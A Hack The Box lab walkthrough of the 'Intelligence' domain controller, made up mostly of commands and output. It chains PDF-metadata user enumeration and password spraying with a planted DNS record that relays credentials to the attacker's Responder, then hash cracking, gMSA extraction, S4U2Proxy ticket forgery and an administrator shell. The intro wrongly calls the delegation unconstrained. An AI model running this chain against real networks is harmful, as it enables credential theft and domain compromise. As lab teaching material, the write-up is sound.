---
categories:
- Hackthebox
image:
  path: intelligence.png
layout: post
media_subpath: /assets/images/intelligence
tags:
- hackthebox
- writeup
- windows
- active-directory
- bloodhound
- ntlm-relay
- responder
- gmsa
- unconstrained-delegation
- s4u2proxy
- dns-spoofing
- medium
title: HTB - Intelligence Walkthrough
---

Intelligence is a medium-difficulty Windows domain controller that demonstrates multiple Active Directory attack techniques including PDF metadata analysis for user enumeration, password spraying, SMB share enumeration, DNS record manipulation to trigger NTLM authentication, NetNTLMv2 hash cracking, gMSA password extraction, and finally S4U2Proxy abuse via unconstrained delegation to impersonate the Administrator.


## Reconnaissance
### Port Scanning

Initial `nmap` scan reveals a Windows domain controller with standard AD services and an IIS web server:

```
nmap -sCV -oA nmap/Intelligence 10.129.95.154
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-11 02:00 -0400
Nmap scan report for 10.129.95.154
Host is up (0.16s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
80/tcp   open  tcpwrapped
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-05-11 13:00:53Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  tcpwrapped
445/tcp  open  tcpwrapped
464/tcp  open  tcpwrapped
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: intelligence.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-05-11T13:01:34
|_  start_date: N/A
|_clock-skew: 7h00m11s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.72 seconds
```

**Key Findings:**

- Domain: `intelligence.htb`
- Hostname: `DC.intelligence.htb`
- IIS web server on port 80
- SMB available on port 445 (for file shares)
- **Note:** No WinRM (5985) - we'll use SMB and WMI for lateral movement

Add domain to hosts file:

```
echo '10.129.95.154   DC.intelligence.htb intelligence.htb DC' | sudo tee -a /etc/hosts
```
## Web Enumeration - PDF Analysis

### Initial Website

The website displays "Lorem Ipsum" placeholder text - appears static.

![img](Pasted image 20260511020535.png)

### Directory Discovery

```
ffuf -u http://10.129.95.154/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -ic -c -e .html

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.95.154/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
 :: Extensions       : .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 7432, Words: 2762, Lines: 130, Duration: 205ms]
index.html              [Status: 200, Size: 7432, Words: 2762, Lines: 130, Duration: 964ms]
documents               [Status: 301, Size: 154, Words: 9, Lines: 2, Duration: 164ms]
```

**Found:** `/documents` directory

![img](Pasted image 20260511021116.png)

The directory returns 403 Forbidden, but the main page reveals two PDF links:
- `http://10.129.95.154/documents/2020-12-15-upload.pdf`
- `http://10.129.95.154/documents/2020-01-01-upload.pdf`

![img](Pasted image 20260511021748.png)

![img](Pasted image 20260511021805.png)

### PDF Date Fuzzing

The naming pattern `YYYY-MM-DD-upload.pdf` suggests more documents exist. Creating a wordlist of dates:

```python
import datetime  
   
start = datetime.date(2020,1,1)  
  
timelapse = 1080 # Dates from 2020-01-01 to 2022-12-31  
   
dates = []  
   
for day in range(timelapse):  
    d = (start + datetime.timedelta(days = day)).isoformat()  
    dates.append(d)  
  
with open("dates.txt", "w") as f:  
    for d in dates:  
        f.write(d + '\n')  
  
print("Dates successfully generated !")
```

Fuzzing for valid PDFs:

```
ffuf -ic -c -w dates.txt -u http://10.129.95.154/documents/FUZZ-upload.pdf -mc all -fc 404 -o out

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.95.154/documents/FUZZ-upload.pdf
 :: Wordlist         : FUZZ: /home/d4rkc0de/LABS/HTB/Machines/Intelligence/files/dates.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
________________________________________________

2020-01-20              [Status: 200, Size: 11632, Words: 157, Lines: 127, Duration: 223ms]
2020-01-01              [Status: 200, Size: 26835, Words: 241, Lines: 209, Duration: 222ms]
2020-01-02              [Status: 200, Size: 27002, Words: 229, Lines: 199, Duration: 222ms]
2020-01-22              [Status: 200, Size: 28637, Words: 236, Lines: 224, Duration: 226ms]
2020-02-11              [Status: 200, Size: 25245, Words: 241, Lines: 198, Duration: 205ms]
2020-02-24              [Status: 200, Size: 27332, Words: 237, Lines: 206, Duration: 146ms]
2020-02-28              [Status: 200, Size: 11543, Words: 167, Lines: 131, Duration: 145ms]
<...SNIP...>
```

Many PDFs exist. Downloading them all:

```
cat out | jq -r '.results[] | "http://10.129.95.154/documents/\(.input.FUZZ)-upload.pdf"' | while read url; do wget "$url"; done
--2026-05-11 02:35:58--  http://10.129.95.154/documents/2020-01-23-upload.pdf
Connecting to 10.129.95.154:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 11557 (11K) [application/pdf]
Saving to: ‘2020-01-23-upload.pdf’

2020-01-23-upload.pdf                                       100%[========================================================================================================================================>]  11.29K  5.50KB/s    in 2.1s    

<....SNIP....>
```

## User Enumeration

### Extracting Usernames from PDF Metadata

```
exiftool * | grep 'Creator' | awk '{print $3}'
```

### Verifying Users with Kerbrute

```
~/TOOLS/kerbrute userenum --dc 10.129.95.154 -d intelligence.htb pot_users

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/11/26 - Ronnie Flathers @ropnop

2026/05/11 02:42:57 >  Using KDC(s):
2026/05/11 02:42:57 >   10.129.95.154:88

2026/05/11 02:42:57 >  [+] VALID USERNAME:       Veronica.Patel@intelligence.htb
2026/05/11 02:42:57 >  [+] VALID USERNAME:       Daniel.Shelton@intelligence.htb
2026/05/11 02:42:57 >  [+] VALID USERNAME:       Jason.Wright@intelligence.htb
<.....SNIP....>
2026/05/11 02:43:20 >  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb
2026/05/11 02:43:20 >  [+] VALID USERNAME:       Scott.Scott@intelligence.htb
2026/05/11 02:43:20 >  [+] VALID USERNAME:       David.Wilson@intelligence.htb
2026/05/11 02:43:20 >  Done! Tested 99 usernames (99 valid) in 6.040 seconds
```

**Result:** 99 valid domain users discovered - all names from the PDF creators are actual AD users.

### AS-REP Roasting Attempt

```
GetNPUsers.py -no-pass intelligence.htb/ -usersfile pot_users
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User William.Lee doesn't have UF_DONT_REQUIRE_PREAUTH set
<.....SNIP....>
[-] User David.Reed doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jose.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Veronica.Patel doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Ian.Duncan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Richard.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
```

**Result:** No users have `UF_DONT_REQUIRE_PREAUTH` set.
## Credential Discovery in PDFs

### Converting PDFs to Text

```
for pdf_file in $(ls); do pdftotext $pdf_file; done
```

### Finding Sensitive Information

```
grep -iE (pass|pwd|secret|login|user) *.txt                                                                      
2020-06-04-upload.txt:Please login using your username and the default password of:
2020-06-04-upload.txt:NewIntelligenceCorpUser9876
2020-06-04-upload.txt:After logging in please change your password as soon as possible.
```

**Critical Finding in `2020-06-04-upload.txt`:**

```text      
New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.
```

## Lateral Movement - Tiffany.Molina

### Password Spraying

```
nxc smb intelligence.htb -u valid_users -p 'NewIntelligenceCorpUser9876' --continue-on-success
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.95.154   445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
<....SNIP....>
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
<....SNIP..>
```

**Valid Credentials Found:** `Tiffany.Molina:NewIntelligenceCorpUser9876`
### SMB Share Enumeration

```
nxc smb intelligence.htb -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876'  --shares                        
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.129.95.154   445    DC               [*] Enumerated shares
SMB         10.129.95.154   445    DC               Share           Permissions     Remark
SMB         10.129.95.154   445    DC               -----           -----------     ------
SMB         10.129.95.154   445    DC               ADMIN$                          Remote Admin
SMB         10.129.95.154   445    DC               C$                              Default share
SMB         10.129.95.154   445    DC               IPC$            READ            Remote IPC
SMB         10.129.95.154   445    DC               IT              READ            
SMB         10.129.95.154   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.95.154   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.95.154   445    DC               Users           READ
```

**Non-Default Shares:**

- `IT` (Read access)
- `Users` (Read access)
### Accessing Users Share and User Flag

```
smbclient.py 'intelligence.htb/Tiffany.Molina:NewIntelligenceCorpUser9876'@10.129.95.154  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use Users
# cd Tiffany.Molina/Desktop
# get user.txt
```

**User flag acquired.**

## Privilege Escalation - Ted.Graves

### BloodHound Analysis (First Pass)

```
sudo ntpdate 10.129.95.154
2026-05-11 10:11:28.406277 (-0400) +25212.432087 +/- 0.069682 10.129.95.154 s1 no-leap
CLOCK: time stepped by 25212.432087


bloodhound-python -c All -d intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -ns 10.129.95.154 --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: intelligence.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Testing resolved hostname connectivity dead:beef::28d9:e788:cbec:4799
INFO: Trying LDAP connection to dead:beef::28d9:e788:cbec:4799
INFO: Testing resolved hostname connectivity dead:beef::1bb
INFO: Trying LDAP connection to dead:beef::1bb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to GC LDAP server: dc.intelligence.htb
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Testing resolved hostname connectivity dead:beef::28d9:e788:cbec:4799
INFO: Trying LDAP connection to dead:beef::28d9:e788:cbec:4799
INFO: Testing resolved hostname connectivity dead:beef::1bb
INFO: Trying LDAP connection to dead:beef::1bb
INFO: Found 43 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.intelligence.htb
INFO: Done in 00M 52S
INFO: Compressing output into 20260511101143_bloodhound.zip
```

Initial analysis shows no direct privilege escalation paths.

### IT Share - PowerShell Script Discovery

```
smbclient.py 'intelligence.htb/Tiffany.Molina:NewIntelligenceCorpUser9876'@10.129.95.154 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use IT
# ls
drw-rw-rw-          0  Sun Apr 18 20:50:58 2021 .
drw-rw-rw-          0  Sun Apr 18 20:50:58 2021 ..
-rw-rw-rw-       1046  Sun Apr 18 20:50:58 2021 downdetector.ps1
# get downdetector.ps1
# exit
```

### Script Analysis

```powershell
��# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

**The Vulnerability:** `-UseDefaultCredentials` sends the current user's (Ted.Graves) NTLM credentials to any web server the script connects to.
### DNS Spoofing Attack

Adding a malicious DNS record:

```
bloodyAD -d intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --host 10.129.95.154 add dnsRecord web-exploit 10.10.14.50 
[+] web-exploit has been successfully added
```

Starting Responder to capture credentials:

```
sudo responder -I tun0      
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49
<....SNIP.....>
[HTTP] NTLMv2 Client   : 10.129.95.154
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:9c383ab8f746f9dc:B3E67D6ABED12F345F525C70BFD9F0B6:0101000000000000C0E631F25BE1DC011266EE07F7A15B9F00000000020008004F00590054005A0001001E00570049004E002D004F005000340038005400380037003600470055004200040014004F00590054005A002E004C004F00430041004C0003003400570049004E002D004F0050003400380054003800370036004700550042002E004F00590054005A002E004C004F00430041004C00050014004F00590054005A002E004C004F00430041004C00080030003000000000000000000000000020000061EDF84EABE5F8B80B560C256914F0D61C8277D395F052C1E1F8D690BEF7ACA00A001000000000000000000000000000000000000900420048005400540050002F007700650062002D006500780070006C006F00690074002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
[*] Skipping previously captured hash for intelligence\Ted.Graves
```

Within 5 minutes (scheduled task interval), we capture

### Cracking NetNTLMv2 Hash

```
hashcat ted.hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting in autodetect mode
<....SNIP.....>

TED.GRAVES::intelligence:9c383ab8f746f9dc:b3e67d6abed12f345f525c70bfd9f0b6:0101000000000000c0e631f25be1dc011266ee07f7a15b9f00000000020008004f00590054005a0001001e00570049004e002d004f005000340038005400380037003600470055004200040014004f00590054005a002e004c004f00430041004c0003003400570049004e002d004f0050003400380054003800370036004700550042002e004f00590054005a002e004c004f00430041004c00050014004f00590054005a002e004c004f00430041004c00080030003000000000000000000000000020000061edf84eabe5f8b80b560c256914f0d61c8277d395f052c1e1f8d690bef7aca00a001000000000000000000000000000000000000900420048005400540050002f007700650062002d006500780070006c006f00690074002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: TED.GRAVES::intelligence:9c383ab8f746f9dc:b3e67d6ab...000000
Time.Started.....: Mon May 11 11:37:41 2026 (10 secs)
Time.Estimated...: Mon May 11 11:37:51 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1096.9 kH/s (3.26ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10817536/14344385 (75.41%)
Rejected.........: 0/10817536 (0.00%)
Restore.Point....: 10813440/14344385 (75.38%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: Ms.Jordan -> Money01
Hardware.Mon.#01.: Temp: 60c Util: 70%

Started: Mon May 11 11:37:31 2026
Stopped: Mon May 11 11:37:53 2026
```

**Cracked Password:** `Mr.Teddy`

**New Credentials:** `Ted.Graves:Mr.Teddy`
## Privilege Escalation - Administrator

### BloodHound Reanalysis

### BloodHound Reanalysis

Running BloodHound with Ted.Graves credentials reveals the attack path:

![img](Pasted image 20260511114039.png)

**Attack Path Discovered:**

- `Ted.Graves` can read gMSA password for `svc_int$`
- `svc_int$` has **Constrained Delegation** to `DC.INTELLIGENCE.HTB`

### Technical Concept: Constrained Delegation

**What is Constrained Delegation?**

Unlike unconstrained delegation (which allows impersonation to ANY service), constrained delegation restricts impersonation to SPECIFIC services on SPECIFIC machines.

**Constrained Delegation Attributes:**

- `msDS-AllowedToDelegateTo` contains the list of allowed SPNs
- Format: `<service>/<hostname>`
- Example: `WWW/dc.intelligence.htb`

**What this means for us:**

- `svc_int$` can impersonate any user to the `WWW` service on `DC.intelligence.htb`
- We cannot impersonate to other services (like CIFS, HOST, etc.)
- We must target the exact allowed SPN
### Verifying Constrained Delegation

From BloodHound:

![img](Pasted image 20260511115150.png)

### gMSA Password Extraction

```
nxc ldap intelligence.htb -u 'TED.GRAVES' -p 'Mr.Teddy' --gmsa
LDAP        10.129.95.154   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:intelligence.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.95.154   389    DC               [+] intelligence.htb\TED.GRAVES:Mr.Teddy 
LDAP        10.129.95.154   389    DC               [*] Getting GMSA Passwords
LDAP        10.129.95.154   389    DC               Account: svc_int$             NTLM: 9e1d80d749feb638de168b576612e990     PrincipalsAllowedToReadPassword: ['DC$', 'itsupport']
```

### S4U2Proxy Attack (with Constrained Delegation)

Requesting a service ticket for Administrator to the allowed service `WWW/dc.intelligence.htb`:

```
getST.py -spn 'WWW/dc.intelligence.htb' -impersonate 'administrator' -hashes :9e1d80d749feb638de168b576612e990 'intelligence.htb/svc_int$' -dc-ip 10.129.95.154
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

**What this does with Constrained Delegation:**

1. `svc_int$` authenticates to KDC using its NTLM hash
2. The KDC checks `msDS-AllowedToDelegateTo` for `svc_int$`
3. Since `WWW/dc.intelligence.htb` is in the allowed list, S4U2Proxy is permitted
4. We receive a service ticket for Administrator to the WWW service

```
nxc smb intelligence.htb -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --generate-krb5-file krb5.conf
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.95.154   445    DC               [+] krb5 conf saved to: krb5.conf
SMB         10.129.95.154   445    DC               [+] Run the following command to use the conf file: export KRB5_CONFIG=krb5.conf
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
export KRB5CCNAME=administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

### Admin Access via WMIExec

Since we have a ticket for the WWW service, we can use WMIExec (which uses DCOM/RPC over SMB):

```
wmiexec.py -k -no-pass administrator@dc.intelligence.htb
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
intelligence\administrator

C:\>
```

**Root flag:** `C:\Users\Administrator\Desktop\root.txt`

